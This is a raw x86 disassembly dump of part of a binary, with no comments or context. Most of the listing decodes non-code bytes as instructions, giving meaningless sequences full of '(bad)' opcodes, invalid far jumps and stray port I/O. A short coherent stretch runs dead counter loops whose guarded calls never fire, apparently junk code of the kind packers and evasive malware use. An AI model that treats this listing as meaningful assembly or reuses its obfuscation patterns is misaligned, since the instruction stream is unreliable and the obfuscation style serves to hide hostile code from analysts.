  4069b0:	xor    ebx,ebx
  4069b2:	jmp    0xd946:0xdd63b5fe
  4069b9:	jne    0x4069aa
  4069bb:	push   ds
  4069bc:	sbb    ch,BYTE PTR [ebx-0x58]
  4069bf:	adc    ebp,DWORD PTR [ecx+0x369c42c6]
  4069c5:	cld    
  4069c6:	or     ch,bh
  4069c8:	mov    DWORD PTR [esi-0x66],esp
  4069cb:	fwait
  4069cc:	jno    0x40699f
  4069ce:	jae    0x40698d
  4069d0:	in     eax,0x39
  4069d2:	les    esp,FWORD PTR [esi+0x31097f6c]
  4069d8:	fistp  WORD PTR [ebx]
  4069da:	and    BYTE PTR [ebp-0xc8227fa],ah
  4069e0:	call   0x77a6:0xf226ca5d
  4069e7:	div    ecx
  4069e9:	sbb    edx,DWORD PTR [eax+ebx*8]
  4069ec:	shl    DWORD PTR [eax+0xa],cl
  4069ef:	adc    ecx,DWORD PTR [esi-0x11]
  4069f2:	test   DWORD PTR [ebp+0x6474baef],ebx
  4069f8:	into   
  4069f9:	push   ds
  4069fa:	or     ecx,edi
  4069fc:	shl    BYTE PTR [esi-0x34afd9b4],0x73
  406a03:	lahf   
  406a04:	shl    BYTE PTR [ebx],0x4e
  406a07:	int    0xa7
  406a09:	arpl   WORD PTR [ecx],sp
  406a0b:	je     0x4069c5
  406a0d:	imul   edi,DWORD PTR [ecx-0x6238a5d5],0xffffffc0
  406a14:	retf   0x42d8
  406a17:	or     BYTE PTR [eax+0x2b],cl
  406a1a:	int    0x38
  406a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a1d:	xchg   ebp,eax
  406a1e:	bound  esi,QWORD PTR [ebx]
  406a20:	arpl   WORD PTR [ecx-0x7bfb6ed],cx
  406a26:	sub    al,BYTE PTR [ebp-0xe]
  406a29:	stos   DWORD PTR es:[edi],eax
  406a2a:	push   ss
  406a2b:	popa   
  406a2c:	xchg   ebp,eax
  406a2d:	test   BYTE PTR [edx+0x5c2d9e97],bh
  406a33:	xchg   BYTE PTR [edi+ebp*1],ch
  406a36:	and    eax,edx
  406a38:	jp     0x406a7e
  406a3a:	nop
  406a3b:	cmp    bh,0x50
  406a3e:	dec    ecx
  406a3f:	ja     0x406a16
  406a41:	cwde   
  406a42:	out    0xf8,eax
  406a44:	inc    eax
  406a45:	test   eax,0x7649d6f
  406a4a:	push   esp
  406a4b:	shl    DWORD PTR [ebx+0x53],0x7c
  406a4f:	or     dh,ch
  406a51:	lods   al,BYTE PTR ds:[esi]
  406a52:	mov    fs,esp
  406a54:	cmp    al,0x76
  406a56:	aam    0x1a
  406a58:	mov    ecx,0x1fc73987
  406a5d:	(bad)  
  406a5e:	push   ecx
  406a5f:	mov    eax,0xce324a2
  406a64:	cdq    
  406a65:	mov    WORD PTR [edx-0x19787d98],?
  406a6b:	ja     0xb87d171f
  406a71:	pop    esp
  406a72:	add    ch,BYTE PTR [eax]
  406a74:	cmp    BYTE PTR [edi+ebp*2],0x51
  406a78:	mov    DWORD PTR [esi-0x68],eax
  406a7b:	ret    
  406a7c:	(bad)  
  406a7d:	retf   
  406a7e:	fdivp  st(3),st
  406a80:	push   eax
  406a81:	or     ecx,edx
  406a83:	test   eax,0x4c9815bc
  406a88:	xchg   ecx,eax
  406a89:	pop    edi
  406a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a8b:	xor    DWORD PTR [ecx],0x6e4ce2d
  406a91:	mov    ebp,0x25add0b3
  406a96:	pop    edx
  406a97:	addr16 nop
  406a99:	lods   eax,DWORD PTR ds:[esi]
  406a9a:	xor    al,0xc
  406a9c:	jecxz  0x406a78
  406a9e:	dec    ebp
  406a9f:	push   edi
  406aa0:	sbb    eax,edi
  406aa2:	in     al,dx
  406aa3:	cmp    dh,BYTE PTR [edi-0x6a]
  406aa6:	jne    0xddf40ca3
  406aac:	xor    dl,BYTE PTR [eax-0x712be8e9]
  406ab2:	js     0x406b1b
  406ab4:	mov    ds:0x9f37de54,al
  406ab9:	mov    dh,0x10
  406abb:	daa    
  406abc:	mov    ebp,0x33ce390b
  406ac1:	rol    DWORD PTR ds:0x32729c,0xc9
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e67b,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fc81,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fc59
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e66f,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fc59
  406b20:	and    esi,DWORD PTR ds:0x42e0a8
  406b26:	mov    DWORD PTR ds:0x42fc59,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e673,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e673,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e673,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e25f
  406b61:	mov    edi,DWORD PTR ds:0x42e673
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e673,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fc71,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fc71,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fc71,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fc7d
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e4bf
  406bad:	mov    edi,DWORD PTR ds:0x42fc71
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fc71,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fc65,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fc65
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fc65,edi
  406bdb:	cmp    DWORD PTR ds:0x42fc65,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fc65,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fc6d
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e3db
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fcf6,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fcf6
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fcf6,edi
  406c22:	cmp    DWORD PTR ds:0x42fcf6,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e687
  406c34:	push   0x42e124
  406c39:	call   DWORD PTR ds:0x42e4c3
  406c3f:	cmp    DWORD PTR ds:0x42fcf6,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fcf6
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fcf6,edi
  406c59:	cmp    DWORD PTR ds:0x42fcf6,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e693,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e68b,0x42fcf6
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x2c
  406c9b:	cmp    ch,BYTE PTR [eax]
  406c9d:	push   esi
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406cf1
  406ca7:	mov    dl,0xc0
  406ca9:	aad    0x8a
  406cab:	and    DWORD PTR [esi],ecx
  406cad:	lods   eax,DWORD PTR ds:[esi]
  406cae:	inc    ecx
  406caf:	(bad)  
  406cb0:	inc    edi
  406cb1:	retf   0xc35f
  406cb4:	std    
  406cb5:	cmp    al,BYTE PTR [edi+0x1ec1d3fb]
  406cbb:	int3   
  406cbc:	jnp    0x406cc8
  406cbe:	pop    edi
  406cbf:	mov    dh,0x97
  406cc1:	mov    ebx,DWORD PTR [edi+0x1254a7c8]
  406cc7:	fistp  WORD PTR [esi]
  406cc9:	pop    ebx
  406cca:	mov    ds:0xcd1252fd,al
  406ccf:	dec    ecx
  406cd0:	mov    esp,ecx
  406cd2:	popa   
  406cd3:	jmp    0x406cc9
  406cd5:	pop    edi
  406cd6:	cdq    
  406cd7:	mov    ebx,?
  406cd9:	xchg   edi,eax
  406cda:	jo     0x406cb9
  406cdc:	les    edi,FWORD PTR [edx-0x8]
  406cdf:	int    0x7f
  406ce1:	fidivr WORD PTR [edx]
  406ce3:	xchg   ebx,eax
  406ce4:	fdivrp st(7),st
  406ce6:	lods   al,BYTE PTR ds:[esi]
  406ce7:	and    al,0x5f
  406ce9:	out    dx,al
  406cea:	cmp    eax,0xc91114b0
  406cef:	clc    
  406cf0:	xlat   BYTE PTR ds:[ebx]
  406cf1:	(bad)  
  406cf2:	xchg   edx,eax
  406cf3:	mov    ebp,0xe0db44d9
  406cf8:	add    ah,BYTE PTR [edi+0x613dd699]
  406cfe:	mov    edx,0x637525be
  406d03:	scas   al,BYTE PTR es:[edi]
  406d04:	or     al,0x8e
  406d06:	push   edx
  406d07:	and    cl,BYTE PTR ds:0xd8ee5a35
  406d0d:	jns    0x406d62
  406d0f:	scas   al,BYTE PTR es:[edi]
  406d10:	nop
  406d11:	and    ebx,eax
  406d13:	sub    BYTE PTR [edx],al
  406d15:	outs   dx,BYTE PTR ds:[esi]
  406d16:	pop    eax
  406d17:	fild   QWORD PTR [eax-0x4ae83c5d]
  406d1d:	and    al,BYTE PTR [ebp+0x67]
  406d20:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  406d22:	cwde   
  406d23:	jbe    0x406d1f
  406d25:	jmp    0x406d58
  406d27:	stos   DWORD PTR es:[edi],eax
  406d28:	adc    BYTE PTR [edi],al
  406d2a:	sub    al,0xa6
  406d2d:	xor    ebp,ecx
  406d2f:	sar    DWORD PTR [edx+ebp*4+0x61c73da7],1
  406d36:	cdq    
  406d37:	call   0x6bd1701a
  406d3c:	xor    al,0xfe
  406d3e:	aad    0x5a
  406d40:	sub    edx,DWORD PTR [ebx+0x696d3fcc]
  406d46:	loopne 0x406dc7
  406d48:	mul    ebx
  406d4a:	lods   eax,DWORD PTR ds:[si]
  406d4c:	mov    bh,0x7f
  406d4e:	ins    DWORD PTR es:[edi],dx
  406d4f:	dec    ebp
  406d50:	aad    0x9c
  406d52:	pop    edx
  406d53:	mov    DWORD PTR [ecx+0x53],edi
  406d56:	es xchg esi,eax
  406d58:	in     eax,0xc
  406d5a:	sahf   
  406d5b:	(bad)  [edi-0x23]
  406d5e:	cmc    
  406d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d60:	dec    ebx
  406d61:	push   ss
  406d62:	mov    ds:0xe650a15e,al
  406d67:	cdq    
  406d68:	jno    0x406d7c
  406d6a:	fcmovb st,st(6)
  406d6c:	cwde   
  406d6d:	mov    cl,0x19
  406d6f:	mov    esi,0x48b11034
  406d74:	jbe    0x406dca
  406d76:	mov    ecx,ebp
  406d78:	sub    BYTE PTR [ecx-0x5894c305],dh
  406d7e:	pop    edx
  406d7f:	lock mov edi,0x7ad1c1d1
  406d85:	jmp    0x1b3d20d1
  406d8a:	jmp    0x406d48
  406d8c:	in     eax,dx
  406d8d:	xor    ebx,DWORD PTR [eax+0x3b0ce9da]
  406d93:	or     DWORD PTR [ebx],esp
  406d95:	xchg   ebx,eax
  406d96:	mov    dh,BYTE PTR [ecx-0x254ddda1]
  406d9c:	test   BYTE PTR [edx],bh
  406d9e:	adc    eax,0xd50db98c
  406da3:	retf   
  406da4:	add    BYTE PTR [esi+0x5fc03a79],ah
  406daa:	add    esi,DWORD PTR [edi+0x3540ddf4]
  406db0:	ins    DWORD PTR es:[edi],dx
  406db1:	sbb    DWORD PTR [ebx+0x7d384c20],esi
  406db7:	pop    DWORD PTR [ecx-0x19ef97ec]
  406dbd:	xchg   edx,eax
  406dbe:	pop    edx
  406dbf:	lods   eax,DWORD PTR ds:[esi]
  406dc0:	loopne 0x406d6a
  406dc2:	inc    ecx
  406dc3:	(bad)  
  406dc4:	out    dx,eax
  406dc5:	aaa    
  406dc6:	scas   eax,DWORD PTR es:[edi]
  406dc7:	in     eax,dx
  406dc8:	inc    ebp
  406dc9:	cmp    ebx,DWORD PTR [edi-0x6c]
  406dcc:	scas   al,BYTE PTR es:[edi]
  406dcd:	ins    DWORD PTR es:[edi],dx
  406dce:	fmul   QWORD PTR [edi+0x3]
  406dd1:	mov    ecx,0x7b420599
  406dd6:	pop    esp
  406dd7:	loop   0x406d72
  406dd9:	pop    DWORD PTR [esi]
  406ddb:	add    eax,DWORD PTR [edx]
  406ddd:	adc    eax,0x75164510
  406de2:	pop    esi
  406de3:	test   eax,0x40c01cad
  406de8:	test   BYTE PTR ds:0x7daea50b,dl
  406dee:	rcr    DWORD PTR [edi],0x4
  406df1:	in     al,0x95
  406df3:	imul   esp,DWORD PTR [edi+0x15],0xfffffff2
  406df7:	retf   
  406df8:	jo     0x406d7e
  406dfa:	aam    0xe6
  406dfc:	push   ecx
  406dfd:	xor    BYTE PTR [eax-0x45],ch
  406e00:	dec    edx
  406e01:	into   
  406e02:	push   ecx
  406e03:	dec    ecx
  406e04:	sub    eax,0x45b72262
  406e09:	adc    al,0xf3
  406e0b:	fsubr  DWORD PTR [eax+0x1d]
  406e0e:	push   ds
  406e0f:	aas    
  406e10:	outs   dx,DWORD PTR ds:[esi]
  406e11:	add    dh,BYTE PTR [esi+esi*8-0x70455a15]
  406e18:	xlat   BYTE PTR ds:[ebx]
  406e19:	inc    esp
  406e1a:	mov    ch,0x1b
  406e1c:	fsubr  QWORD PTR [eax-0xd870052]
  406e22:	fidiv  DWORD PTR [ecx]
  406e24:	jnp    0x406e93
  406e26:	add    eax,0xb52aeedd
  406e2b:	in     al,0xa8
  406e2d:	xor    BYTE PTR [ebx+0x3],dl
  406e30:	daa    
  406e31:	mov    bh,0x52
  406e33:	icebp  
  406e34:	std    
  406e35:	cli    
  406e36:	icebp  
  406e37:	cdq    
  406e38:	ret    0x71b9
  406e3b:	es xchg ecx,eax
  406e3d:	mov    bl,0xff
  406e3f:	lar    ecx,dx
  406e42:	mov    esp,0x2f4939cb
  406e47:	arpl   bx,ax
  406e49:	cld    
  406e4a:	mov    cl,ch
  406e4c:	fcom   st(1)
  406e4e:	cdq    
  406e4f:	mov    BYTE PTR [esi+0x1661c53b],0xa0
  406e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e57:	sahf   
  406e58:	sub    al,BYTE PTR [esi]
  406e5a:	cmp    BYTE PTR [edx-0xc505ce],ch
  406e60:	push   edi
  406e61:	shl    DWORD PTR [edx+0x5e],1
  406e64:	mov    bh,0x56
  406e66:	dec    esp
  406e67:	mov    eax,ds:0x5778e9b2
  406e6c:	lods   eax,DWORD PTR ds:[esi]
  406e6d:	into   
  406e6e:	(bad)  
  406e6f:	pop    ecx
  406e70:	frstor [ebp-0x8791d28]
  406e76:	fimul  WORD PTR ds:0x60ac5fea
  406e7c:	sub    eax,0x483b2273
  406e81:	sub    BYTE PTR [ebx-0x2dc5c18c],0x62
  406e88:	xchg   edx,esp
  406e8a:	jbe    0x406e3d
  406e8c:	(bad)  
  406e8d:	push   ebx
  406e8e:	inc    esp
  406e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e90:	jno    0x406e67
  406e92:	dec    ebx
  406e93:	push   ebx
  406e94:	loope  0x406e2d
  406e96:	inc    ebp
  406e97:	retf   0xcb28
  406e9a:	mov    ds:0xfab96665,eax
  406e9f:	ds push eax
  406ea1:	dec    edi
  406ea2:	add    ebx,DWORD PTR [ecx+0x13]
  406ea5:	dec    ebx
  406ea6:	or     dl,ch
  406ea8:	mov    edi,esp
  406eaa:	add    ah,BYTE PTR [edi]
  406eac:	cmp    eax,0x295fc3c2
  406eb1:	pushf  
  406eb2:	nop
  406eb3:	jmp    0x406f0f
  406eb5:	nop
  406eb6:	(bad)  
  406eb7:	mov    ecx,0x87169b32
  406ebc:	lods   eax,DWORD PTR ds:[esi]
  406ebd:	cmp    al,0xbf
  406ebf:	cmp    dh,bh
  406ec1:	mov    dl,0xbe
  406ec3:	and    eax,0x1e2692f
  406ec8:	inc    esi
  406ec9:	sub    DWORD PTR [eax+edx*4-0x43],esi
  406ecd:	cmp    edx,DWORD PTR [edi]
  406ecf:	sahf   
  406ed0:	das    
  406ed1:	es mov bh,0xa0
  406ed4:	dec    edi
  406ed5:	mov    ah,0x8f
  406ed7:	ror    BYTE PTR [ebp+0x43e3a069],cl
  406edd:	aas    
  406ede:	lods   eax,DWORD PTR ds:[esi]
  406edf:	(bad)  
  406ee0:	push   0xffffffd2
  406ee2:	xchg   BYTE PTR [ecx+0x18],dl
  406ee5:	cmp    ecx,edx
  406ee7:	fwait
  406ee8:	in     al,dx
  406ee9:	push   ebp
  406eea:	into   
  406eeb:	cdq    
  406eec:	xlat   BYTE PTR ds:[ebx]
  406eed:	xchg   ebx,eax
  406eee:	lock sbb eax,0x2e7bfc7
  406ef4:	(bad)  
  406ef5:	xchg   ebx,eax
  406ef6:	lods   al,BYTE PTR ds:[esi]
  406ef7:	test   eax,0xc56700b7
  406efc:	pop    es
  406efd:	daa    
  406efe:	cmp    eax,0x391b0bdd
  406f03:	dec    ebx
  406f04:	cmp    ah,dl
  406f06:	push   es
  406f07:	out    0x74,al
  406f09:	in     eax,dx
  406f0a:	cmc    
  406f0b:	mov    edi,0x5d7ed63c
  406f10:	mov    al,BYTE PTR [ebp+eax*2+0xb8cb4e9]
  406f17:	jo     0x406f51
  406f19:	fstp   QWORD PTR [ecx]
  406f1b:	inc    edx
  406f1c:	out    0x14,eax
  406f1e:	fmul   QWORD PTR [edx+ebx*8+0x66]
  406f22:	xor    bh,BYTE PTR ds:0x7f6aa774
  406f28:	jle    0x406fa5
  406f2a:	int3   
  406f2b:	ret    
  406f2c:	sub    ch,ah
  406f2e:	je     0x406f36
  406f30:	je     0x406f62
  406f32:	adc    BYTE PTR [ebx+edi*8+0x4c],bh
  406f36:	push   0xefda2c21
  406f3b:	mov    bl,0x31
  406f3d:	popa   
  406f3e:	mov    esi,0x9dab6644
  406f43:	sbb    ah,BYTE PTR [ebx+ecx*4-0x2d6cfc76]
  406f4a:	imul   ecx,esi,0x7c
  406f4d:	out    0x74,al
  406f4f:	jge    0x406f22
  406f51:	std    
  406f52:	mov    WORD PTR ds:0x9c86793f,gs
  406f58:	push   ebp
  406f59:	fcom   QWORD PTR [edx]
  406f5b:	scas   eax,DWORD PTR es:[edi]
  406f5c:	adc    eax,0xe7a4d850
  406f61:	stc    
  406f62:	(bad)  
  406f63:	cli    
  406f64:	xor    al,0xa5
  406f66:	sub    ebp,DWORD PTR fs:[ebx]
  406f69:	aas    
  406f6a:	pop    ss
  406f6b:	mov    ch,dl
  406f6d:	mov    eax,ds:0xce75310a
  406f72:	jno    0x406f1b
  406f74:	ins    DWORD PTR es:[edi],dx
  406f75:	mov    ebx,0x62337086
  406f7a:	sbb    ch,BYTE PTR ss:[edx]
  406f7d:	retf   
  406f7e:	sti    
  406f7f:	xor    cl,BYTE PTR [ebx+0x4baee932]
  406f85:	pop    ebx
  406f86:	sbb    al,0xa8
  406f88:	xor    esp,DWORD PTR [esi+0x5d]
  406f8b:	jecxz  0x406f3a
  406f8d:	dec    esp
  406f8e:	and    al,0x5f
  406f90:	neg    DWORD PTR [edi-0x6f]
  406f93:	fxch   st(1)
  406f95:	push   esp
  406f96:	xchg   ebp,eax
  406f97:	or     ebp,DWORD PTR [eax+0x79]
  406f9a:	into   
  406f9b:	and    eax,0x7127db03
  406fa0:	sar    dl,0x37
  406fa3:	mov    ah,0x61
  406fa5:	repz mov bl,0xd6
  406fa8:	(bad)  
  406fa9:	sub    eax,0x67d78ad2
  406fae:	mov    bl,0x9
  406fb0:	xlat   BYTE PTR ds:[ebx]
  406fb1:	inc    eax
  406fb2:	retf   
  406fb3:	mov    ebx,0xe778eba9
  406fb8:	fist   WORD PTR ds:0xb588762f
  406fbe:	psubq  mm6,QWORD PTR [edx]
  406fc1:	sub    al,0x38
  406fc3:	jge    0x406f75
  406fc5:	mov    WORD PTR [esi],ss
  406fc7:	or     al,0x44
  406fc9:	cwde   
  406fca:	push   ebp
  406fcb:	ret    0xf885
  406fce:	add    eax,DWORD PTR [ecx+0x513daa46]
  406fd4:	fcom   DWORD PTR [esi+0x31cc45c7]
  406fda:	add    eax,0x1581f89f
  406fdf:	repnz cld 
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx-0x38ffbd1a],cl
  406fe8:	inc    ebp
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [ecx],di
  40700c:	jl     0x406fda
  40700e:	lahf   
  40700f:	mov    edx,0x7d207070
  407015:	jo     0x407087
  407017:	daa    
  407018:	sub    edx,eax
  40701a:	loope  0x407055
  40701c:	(bad)  
  40701e:	imul   edi,DWORD PTR [ecx-0x5c],0xffffffc5
  407022:	dec    edx
  407023:	mov    ch,BYTE PTR [edx]
  407025:	jg     0x406fd6
  407027:	jmp    0xcd4891e
  40702c:	clc    
  40702d:	pop    ds
  40702e:	mov    edi,0x93748e40
  407033:	arpl   WORD PTR [ebx],si
  407035:	fisubr DWORD PTR ss:[esi]
  407038:	sar    DWORD PTR [esi+ebx*8-0x3d],0xbc
  40703d:	jns    0x4070b5
  40703f:	cs dec esi
  407041:	fstp   QWORD PTR [edi]
  407043:	xchg   ebp,eax
  407044:	ins    BYTE PTR es:[edi],dx
  407045:	and    esp,DWORD PTR [ecx+0x4c08784c]
  40704b:	fmul   QWORD PTR [edx-0x1f06d3d8]
  407051:	cdq    
  407052:	dec    ebx
  407053:	push   es
  407054:	cmp    edx,DWORD PTR [esi]
  407056:	push   ss
  407057:	es and ah,bl
  40705a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40705b:	je     0x407048
  40705d:	out    dx,al
  40705e:	mov    dh,0x44
  407060:	dec    ecx
  407061:	and    ah,al
  407063:	inc    edi
  407064:	out    dx,al
  407065:	or     ebp,DWORD PTR [ebp-0x13]
  407068:	stos   BYTE PTR es:[edi],al
  407069:	pop    ebx
  40706a:	mov    ds:0x5148f4b8,al
  40706f:	fwait
  407070:	loope  0x407008
  407072:	int3   
  407073:	popa   
  407074:	xchg   edi,eax
  407075:	add    DWORD PTR [ecx+0x26],0x9e6e770d
  40707c:	mov    ds:0xcfaf06b3,eax
  407081:	(bad)  
  407083:	sbb    dh,BYTE PTR [eax+0x112ff27a]
  407089:	sub    cl,dh
  40708b:	cli    
  40708c:	or     DWORD PTR ds:0x2860d032,0xffffffe6
  407093:	and    al,0x2d
  407095:	dec    edx
  407096:	add    BYTE PTR [edx],0x13
  407099:	dec    ecx
  40709a:	stc    
  40709b:	sub    eax,0x8b8d932d
  4070a0:	cmp    al,0xae
  4070a2:	test   al,0xc1
  4070a4:	les    ebx,FWORD PTR [ecx]
  4070a6:	(bad)  
  4070a7:	scas   eax,DWORD PTR es:[edi]
  4070a8:	and    cl,BYTE PTR [edi+0x5092a85a]
  4070ae:	in     eax,dx
  4070af:	xchg   edi,eax
  4070b0:	stos   DWORD PTR es:[edi],eax
  4070b1:	sub    al,BYTE PTR [esi]
  4070b3:	xor    al,0x18
  4070b5:	bswap  eax
  4070b7:	sbb    dl,0x57
  4070ba:	mov    bl,0x19
  4070bc:	(bad)  
  4070bd:	push   ecx
  4070be:	mov    ecx,0x305f864
  4070c3:	mov    eax,ds:0xfee9848d
  4070c8:	int    0x5e
  4070ca:	scas   al,BYTE PTR es:[edi]
  4070cb:	cmp    BYTE PTR [esi+0x499fc703],0xb1
  4070d2:	mov    al,ds:0xa794bc9a
  4070d7:	pushf  
  4070d8:	in     al,dx
  4070d9:	call   0xa7a8:0x39c51398
  4070e0:	test   al,0xa1
  4070e2:	add    ebx,DWORD PTR [edx-0x6c1e85b1]
  4070e8:	mov    edx,0x225b214d
  4070ed:	xchg   ebp,eax
  4070ee:	ret    
  4070ef:	jge    0x407089
  4070f1:	pop    ebp
  4070f2:	mov    eax,ds:0xa6997595
  4070f7:	xchg   ebp,eax
  4070f8:	out    0xc9,al
  4070fa:	push   cs
  4070fb:	test   DWORD PTR [eax+0x692140ce],esp
  407101:	js     0x407138
  407103:	(bad)  
  407104:	es and eax,0x42b61be0
  40710a:	or     DWORD PTR [edx+esi*1-0x556a8bca],esp
  407111:	pop    esi
  407112:	sahf   
  407113:	(bad)  
  407114:	ror    ebp,1
  407116:	push   esi
  407117:	mov    eax,0xeefdca0a
  40711c:	rcl    esp,0xd1
  40711f:	or     BYTE PTR [ebp-0x27377c40],al
  407125:	or     edx,DWORD PTR [eax+0x3e18f036]
  40712b:	icebp  
  40712c:	popf   
  40712d:	(bad)  
  40712e:	std    
  40712f:	inc    ebp
  407130:	mov    esi,0xac31f127
  407135:	add    BYTE PTR [ebx+ebx*8],cl
  407138:	cli    
  407139:	lods   al,BYTE PTR ds:[esi]
  40713a:	and    eax,0xdf05d3df
  40713f:	dec    esp
  407140:	test   DWORD PTR [edx-0x1ed9a68e],0x46b4db3a
  40714a:	rcr    eax,1
  40714c:	add    eax,0x97b934b5
  407151:	clc    
  407152:	stos   BYTE PTR es:[edi],al
  407153:	sbb    esp,DWORD PTR [esp-0x18ed8044]
  40715a:	not    DWORD PTR [eax+0x344cdd49]
  407160:	in     al,0x71
  407162:	out    0x99,eax
  407164:	push   ebp
  407165:	pop    eax
  407166:	test   DWORD PTR ss:[edx+0x58103b56],ebx
  40716d:	mov    ch,0xd7
  40716f:	je     0x40713a
  407171:	ins    BYTE PTR es:[edi],dx
  407172:	imul   esi,DWORD PTR [edx*2-0x2ccc7511],0xffffffc3
  40717a:	jne    0x4070fc
  40717c:	sti    
  40717d:	push   edx
  40717e:	sub    eax,0x8d79727b
  407183:	lahf   
  407184:	(bad)  
  407186:	push   0x1a
  407188:	lock enter 0x8c9f,0x55
  40718d:	jne    0x40713d
  40718f:	pop    esp
  407190:	adc    esi,DWORD PTR [esi]
  407192:	jecxz  0x4071f3
  407194:	dec    ecx
  407195:	imul   edx,DWORD PTR [eax+0x250fdb87],0x66
  40719c:	je     0x4071ae
  40719e:	jo     0x4071af
  4071a0:	and    al,0xed
  4071a2:	sub    eax,DWORD PTR [ebx-0x6a]
  4071a5:	mov    DWORD PTR [ebx-0x7cfd762c],ecx
  4071ab:	(bad)  
  4071ac:	sbb    ah,dl
  4071ae:	xchg   ebx,eax
  4071af:	je     0x407224
  4071b1:	inc    DWORD PTR [edx+0x1452334d]
  4071b7:	popa   
  4071b8:	dec    esp
  4071b9:	pusha  
  4071ba:	pop    ecx
  4071bb:	sub    eax,0x95f65286
  4071c0:	retf   
  4071c1:	lock call 0xde3c3816
  4071c7:	add    esp,DWORD PTR [eax-0x57]
  4071ca:	pop    es
  4071cb:	daa    
  4071cc:	and    DWORD PTR [edi],ecx
  4071ce:	retf   0x2cb1
  4071d1:	imul   ebp,esp,0x34
  4071d4:	mov    ah,0x49
  4071d6:	frstor [ecx+0x5a]
  4071d9:	aaa    
  4071da:	mov    dh,0x47
  4071dc:	cmp    eax,0xaf4f102f
  4071e1:	jmp    0x4071e2
  4071e3:	mov    ds:0x49b1a8c5,eax
  4071e8:	dec    eax
  4071e9:	dec    ebx
  4071ea:	lock fidiv WORD PTR [esi+eiz*4]
  4071ee:	ret    
  4071ef:	lahf   
  4071f0:	stc    
  4071f1:	mov    ebx,0xd5342046
  4071f6:	xchg   edi,eax
  4071f7:	mov    cl,0xc0
  4071f9:	jg     0x4071dc
  4071fb:	lahf   
  4071fc:	enter  0x90b4,0x63
  407200:	adc    eax,0x1689069b
  407205:	mov    bh,0x47
  407207:	inc    ebp
  407208:	adc    al,0x87
  40720a:	aaa    
  40720b:	pop    ds
  40720c:	and    DWORD PTR [ebp-0x847a36f],edi
  407212:	inc    eax
  407213:	ins    DWORD PTR es:[edi],dx
  407214:	sbb    BYTE PTR [ebp+0x1fda1b80],dl
  40721a:	push   edx
  40721b:	mov    dl,0x79
  40721d:	jle    0x407275
  40721f:	xchg   esi,eax
